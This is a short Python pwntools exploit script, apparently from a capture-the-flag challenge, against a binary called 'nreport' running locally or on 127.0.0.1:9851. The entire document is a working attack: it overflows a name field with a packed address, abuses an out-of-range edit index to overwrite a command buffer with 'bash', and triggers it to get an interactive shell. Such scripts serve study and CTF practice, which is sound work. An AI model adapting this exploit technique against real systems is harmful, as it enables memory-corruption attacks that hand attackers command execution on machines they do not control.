from pwn import *


def create(title, msg):
    p.sendline(b"1")
    p.sendline(title.encode())
    p.sendline(msg.encode())


def edit(num, title, msg):
    p.sendline(b"3")
    p.sendline(str(num).encode())
    p.sendline(title.encode())
    p.sendline(msg.encode())


if args["REMOTE"]:
    p = remote("127.0.0.1", 9851)
else:
    p = process("./nreport")

command_addr = 0x4041A8

# send token
p.sendline(b"aaaxxxxxxaxxxs")
# send name
p.sendline(b"0xdf" + b"\x00" * 4 + p64(command_addr))

create("title", "message")
edit(13, "bash\x00", "0xdf")
x = p.recv()
p.sendline(b"5")
p.interactive()
